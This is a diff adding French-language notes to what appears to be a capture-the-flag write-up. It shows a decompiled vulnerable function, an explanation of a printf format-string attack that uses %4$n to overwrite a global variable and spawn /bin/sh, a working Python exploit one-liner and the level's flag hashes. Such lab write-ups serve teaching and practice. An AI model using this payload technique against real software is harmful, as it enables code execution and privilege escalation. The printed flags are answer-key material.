@@ -69,6 +69,43 @@ x/s 0xb7f8cc58
 ## flag : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
 # flag 03
+export VALGRIND_LIB=/tmp/valgrind_local/libexec/valgrind
+/tmp/valgrind_local/bin/valgrind
 
 
+void v(void)
+
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+  if (m == 0x40) {
+    fwrite("Wait what?!\n",1,0xc,stdout);
+    system("/bin/sh");
+  }
+  return;
+}
+
+addresse de m à controler : 0x804988c
+
+0x40 = 64 en décimal
+
+on a remarqué que nous pouvions faire une format string attack avec printf
+et en essayant avec %x pour afficher les valeurs de la stack 4 byte par 4 byte:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %x %x %x %x %x
+
+nous trouvons le résultat suivant :
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 200 2e0ac0 1257d0 41414141 41414141
+
+on peut ensuite utiliser l'argument %n qui écrit le nombre de caractères formatés dans l'argument passé à printf
+
+cependant comme nous ne contrôlons pas les arguments de la fonction printf nous pouvons utiliser le fait que le 4ème élément de la stack est égal à au début de notre buffer pour faire écrire à printf sur l'adresse de m (avec %4$n qui écrit directement sur le 4ème argument de la stack) et ainsi faire en sorte que m soit égal à 64 (0x40) (nombre de caractères imprimés) pour déclencher le system("/bin/sh")
+
+(python -c 'print("\x8c\x98\x04\x08" + (" " * 60) + "%4$n")'; cat) | ./level3
+
+## flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+# flag 04
 
